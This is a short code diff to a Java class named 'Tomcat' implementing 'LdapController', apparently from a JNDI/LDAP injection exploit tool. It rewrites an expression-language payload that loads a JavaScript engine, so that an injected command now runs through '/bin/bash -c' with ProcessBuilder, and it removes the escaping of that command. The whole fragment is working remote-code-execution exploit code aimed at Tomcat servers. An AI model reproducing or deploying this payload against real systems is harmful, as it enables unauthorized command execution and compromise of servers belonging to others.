@@ -34,9 +34,9 @@ public class Tomcat implements LdapController {
     String payload = ("{" +
             "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
             ".newInstance().getEngineByName(\"JavaScript\")" +
-            ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
+            ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','${command}']).start()\")" +
             "}")
-            .replace("${command}", makeJavaScriptString(Config.command));
+            .replace("${command}", Config.command);
 
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
 
